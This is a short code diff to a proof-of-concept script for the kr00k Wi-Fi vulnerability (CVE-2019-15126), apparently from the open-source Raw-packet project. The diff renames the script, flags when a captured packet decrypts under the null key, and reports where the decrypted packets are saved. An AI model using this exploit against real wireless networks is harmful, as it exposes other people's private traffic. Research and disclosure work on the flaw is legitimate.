@@ -3,7 +3,7 @@
 
 # region Description
 """
-capture.py: Script for sniffing 802.11x authentication packets
+kr00k_scapy.py: PoC of CVE-2019-15126 kr00k vulnerability
 Authors: Gleb Cherbov, Vladimir Ivanov
 License: MIT
 Copyright 2020, Raw-packet Project
@@ -82,6 +82,7 @@ def analyze_packet(packet):
         assert plaintext is not None, 'Can not decrypt packet with NULL TK'
 
         base.print_success("Got a kr00ked packet!")
+        variables['found kr00k packet'] = True
 
         packet_type = plaintext[6:8]
         ethernet_header = bytes.fromhex(addr3 + addr2) + packet_type
@@ -106,14 +107,13 @@ if __name__ == '__main__':
     # endregion
 
     # region Variables
-    variables: Dict[str, Union[int, str, bytes]] = dict()
+    variables: Dict[str, Union[bool, int, str, bytes]] = dict()
     # endregion
 
     try:
 
         # region Check user and platform
         base.check_user()
-        # base.check_platform()
         # endregion
 
         # region Parse script arguments
@@ -141,6 +141,9 @@ if __name__ == '__main__':
 
             for encrypted_packet in encrypted_packets:
                 analyze_packet(packet=encrypted_packet)
+
+            assert 'found kr00k packet' in variables.keys(), 'Not found kr00k packets'
+            base.print_success('Decrypted packets save in: ', args.pcap_path_result)
         # endregion
 
     except KeyboardInterrupt:
